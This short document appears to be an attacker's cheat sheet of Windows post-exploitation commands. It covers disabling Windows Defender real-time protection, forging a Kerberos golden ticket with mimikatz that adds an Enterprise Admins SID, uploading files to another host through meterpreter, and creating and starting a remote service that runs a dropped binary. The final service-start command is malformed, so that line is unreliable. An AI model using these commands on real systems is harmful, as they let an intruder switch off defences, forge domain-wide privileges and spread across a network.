
##Disable Windows Defender:
powershell Set-MpPreference -DisableRealtimeMonitoring $true

SID Hopping:
mimikatz.exe | kerberos::golden /user:<dc>$ /krbtgt:<krbtgt ntlm hash> /domain:<currentdomain> /sid:S-1-5-21-<currentSID> /sids:S-1-5-21-<newSID>-519 /ptt

upload to another host via meterpreter:
upload /path/to/local/file \\\\remotemachine.com\\C$\\Windows\\Temp\\Blah

Make a service remotely:

sc \\remotemachine.com\ create <servicename> binpath= c:\windows\temp\binary.sys

Start service:

sc \\remotemachine.com\ create start <servicename>  


